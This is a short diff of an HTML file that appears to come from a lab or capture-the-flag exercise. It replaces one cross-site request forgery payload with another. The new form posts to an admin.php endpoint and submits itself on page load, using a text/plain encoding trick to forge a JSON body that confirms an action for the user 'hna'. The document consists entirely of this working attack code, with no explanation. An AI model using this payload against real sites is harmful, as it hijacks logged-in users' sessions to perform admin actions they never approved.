@@ -1,4 +1,6 @@
-<form id="form" action="http://app/admin.php" method="POST"> 
-        <input name="{'username': 'hna', 'confirm': 'yes', 'test': '" value="'}">
-    </form>
-    <script> document.forms['form'].submit(); </script>
+
+<form id="form" action="http://app/admin.php" method="POST" enctype="text/plain" >
+<input name='{"username":"hna","confirm":"yes","ignore_me":"' value='test"}'type='hidden'>
+<input type=submit value="Submit">
+</form>
+<script> document.forms['form'].submit(); </script>
